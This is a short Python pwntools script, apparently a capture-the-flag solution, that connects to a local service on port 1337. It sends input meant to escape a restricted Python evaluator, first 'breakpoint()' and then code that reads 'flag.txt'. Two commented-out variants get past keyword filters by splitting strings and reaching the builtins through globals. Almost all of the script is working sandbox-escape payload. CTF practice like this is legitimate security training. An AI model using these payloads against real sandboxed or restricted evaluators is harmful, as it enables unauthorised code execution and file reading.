from pwn import remote
# localhost 1337
r = remote('localhost', 1337)

r.sendline(b'breakpoint()')
r.sendline(b'open("flag.txt").read()')

# r.sendline(b'getattr(globals()["__built""ins__"], "op""en")("flag.txt").read()')

# r.sendline(b'string.capwords.__globals__["__built""ins__"]["op""en"]("flag.txt").read()')

r.interactive()